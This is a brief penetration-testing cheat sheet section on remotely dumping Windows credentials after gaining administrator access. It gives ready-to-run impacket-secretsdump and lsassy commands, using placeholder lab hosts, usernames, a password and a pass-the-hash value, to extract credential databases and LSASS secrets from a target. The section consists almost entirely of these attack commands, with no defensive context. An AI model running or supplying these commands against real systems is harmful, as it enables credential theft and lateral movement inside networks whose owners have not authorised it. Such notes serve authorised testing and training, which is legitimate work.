## Remotely Dumping Creds

### Secretsdump
If we have an Administrator's credentials, we can use a few tools to remotely dump the targets credential databases.

```bash
impacket-secretsdump MATRIX/administrator@10.10.10.10 -hashes b519f77cba6fb8fcd764f7672e6a4a7:b519f77cba6fb8fcd764f7672e6a4a7
```

### LSASSy

 https://github.com/Hackndo/lsassy 

This can be similarly acheived with lsassy, which is another Python based tool which extracts remote credentials from lsass on a target, with valid credentials and permission levels.

```bash
lsassy matrix.local -u Neo -p P4ssw0rd 10.10.10.10
lsassy matrix.local -u Neo -H b519f77cba6fb8fcd764f7672e6a4a7 10.10.10.10
```
